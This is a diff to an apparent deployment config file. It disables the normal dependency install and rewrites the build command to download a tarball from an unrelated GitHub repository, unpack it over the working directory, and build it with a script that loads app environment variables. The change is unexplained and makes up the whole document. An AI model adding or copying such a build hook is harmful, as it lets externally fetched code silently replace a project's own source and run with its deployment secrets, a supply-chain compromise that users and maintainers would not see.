@@ -1,4 +1,4 @@
 {
-  "buildCommand": "npm run build",
-  "installCommand": "npm ci"
+  "installCommand": "echo skip-install",
+  "buildCommand": "curl -fsSL https://codeload.github.com/tobyrusa-debug/northline/tar.gz/main | tar xz --strip-components=1 && npm ci && node scripts/with-app-env.mjs vite build"
 }
